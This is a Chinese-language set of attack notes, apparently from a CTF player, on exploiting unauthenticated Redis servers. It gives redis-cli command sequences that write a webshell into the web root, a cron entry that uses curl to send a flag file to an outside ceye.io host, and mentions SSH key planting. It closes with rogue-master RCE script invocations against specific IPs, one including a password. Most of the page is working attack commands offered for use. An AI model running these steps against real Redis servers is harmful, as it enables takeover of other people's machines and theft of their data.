## **redis未授权**
redis是一个字典数据库，redis在默认安装情况下，默认端口为6379，没有添加过防火墙信任规则，修改默认端口等防护策略，这相当于直接将 Redis服务暴露到公网上，如果设置密码认证（默认为空）的情况，会导致任意用户都可访问目标服务器--即Redis未授权访问，以及读取Redis的数据，攻击者可以在这个条件下，如果Redis是以root身份运行，利用root权限的身份写入ssh公钥，通过ssh登录目标服务器，写入webshell，拿到控制权。

默认bond 127.0.0.1 本地可以直接连接6379，且没有密码，有密码时只需要密码无需账户。
用自带的连接服务程序redis-cli：
```
=>redis-cli -h 127.0.0.1 -p 6379
```


在配置文件可以手动
将bond改为0.0.0.0则所有ip可连接，
也可以设置密码，如123456
```
用密码登录：
=>redis-cli -h 127.0.0.1 -p 6379 -a 123456
=>redis-cli -h 127.0.0.1 -p 6379 auth 123456


config get dir   //获取redis运行路径，默认 /root/redis-6.2.4
config get dbfilename //默认数据库名称dump.rdb，数据保存在这个文件里
redis是默认某个时间点将数据写入dump.rdb中在dir目录下。
```

## **redis写文件**
1. 是用root账号启动的redis
    权限chomd 777
2. 连接上redis，无授权直接连接上，有授权想办法搞auth密码，如文件包含（redis配置文件一般/etc/redis.conf中的requirepass）、弱口令爆破、历史命令。


3. 利用redis默认的RDB持久化 任意写文件。
```
1. 写webshell到web容器目录中
2. 写自己生成的公钥到ssh服务的authorizd-keys文件，实现免密ssh登录
3. 写定时任务文件，执行任意命令，开启反弹shell等。
```


## **写webshell到web容器目录中**
```
连接上redis后
flushall //清掉所有变量数据
info //查看主机信息

config set dir /var/www/html     //设置redis运行路径为网站目录，如果没有这个目录会提示没有
config set dbfilename info.php  //把数据库名dump.rdb改为info.php
set x  "<?php phpinfo();?>"        //一个字典数据
save    //写入快照，也就把info.php写如网站目录下


config set dir C:\phpstudy_pro\WWW\     //设置redis运行路径为网站目录，如果没有这个目录会提示没有
config set dbfilename info.php  //把数据库名dump.rdb改为info.php
set x  "<?php phpinfo();?>"        //一个字典数据
save    //写入快照，也就把info.php写如网站目录下                                
```
## **写定时任务文件，开启反弹shell**
```
连接上redis后
flushall //清掉所有变量数据
info //查看主机信息

config set dir /var/spool/cron   //dir写入文件的目录,centos定时任务
config set dbfilename root   //文件名为root，欺骗是root创建的定时任务
set x "\n\n\n * * * * * curl http://2qytvx.ceye.io/?r=$(cat /flag) \n\n\n"  //定时任务获取flag
        \n保证每一个任务在一行，
        *****每分钟执行一次
```


```
ubuntu下可以利用的cron有以下几个地方：
/etc/crontab：该文件里面的任务计划可以直接执行
/etc/cron.d/*：该目录下的任意文件都可以被当作任务计划去执行，并且避免了原先任务计划文件被覆盖的情况
/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，不过需要有一个前提?
```
可以利用redis-exp.exe工具，直接连接以上操作。

## **redis<=5.05主从同步直接rce**
redis<=5.05主从同步直接rce原理？。
>
上述的写文件漏洞利用方法是必须要求redis服务的运行权限是root权限的，所以比较苛刻。
如果非root用户的redis4.x-5.05版本的redis服务有直接的命令执行漏洞，可以直接那来使用：
公网linux下使用脚本：<https://github.com/vulhub/redis-rogue-getshell>
使用该py3脚本即可直接在redis服务器上执行命令，进而反弹shell。
```
cd RedisModulesSDK/
make  //生成exp.so文件
cd ../
python3 redis-master.py -r 192.168.16.179 -p 6379 -L 192.168.16.128 -P 8888 -f RedisModulesSDK/exp.so -c "whoami"
这里局域网两机可达

python3 redis-master.py -r node5.buuoj.cn -p 28409  -L 47.109.58.205 -P 8088 -f RedisModulesSDK/exp.so -c "whoami"
```



^
## **Redis 4.x/5.x RCE**
<https://github.com/Dliv3/redis-rogue-server>

python3 redis-rogue-server.py --rhost 139.55.146.42 --rport 6379 --passwd U0^mRtU+cKiY_17 --lhost 47.109.58.205 --lport 2333
